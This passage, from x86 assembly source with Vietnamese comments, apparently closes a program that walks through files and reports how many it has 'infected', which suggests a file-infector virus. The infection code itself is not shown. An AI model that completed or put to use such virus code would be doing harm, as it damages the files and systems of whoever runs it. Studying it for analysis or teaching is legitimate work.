    Push DWORD PTR [Ebp - 84h]
    Call [pCloseHandle]

    ; Xuống dòng
    Push OFFSET newline
    Call PrintConsole
    Jmp find_next_file

find_next_file:
    ; Xuống dòng cho file không nhiễm
    Push OFFSET newline
    Call PrintConsole

    ; Tìm file tiếp theo
    Lea Eax, [Ebp - 300h]
    Push Eax 
    Push DWORD PTR [Ebp - 50h]
    Call [pFindNextFileA]
    Test Eax, Eax 
    Jnz file_loop

    ; Đóng search handle
    Push DWORD PTR [Ebp - 50h]
    Call [pCloseHandle]

show_summary:
    ; === HIỂN THỊ TỔNG KẾT ===
    Push OFFSET completed_msg
    Call PrintConsole

    ; Hiển thị số file đã xử lý
    Push [file_count]
    Call PrintNumber
    Push OFFSET file_count_msg
    Call PrintConsole

    ; Hiển thị số file đã nhiễm
    Push [infected_count]
    Call PrintNumber
    Push OFFSET infected_count_msg
    Call PrintConsole

exit_program:
    Push 0
    Call [pExitProcess]

End start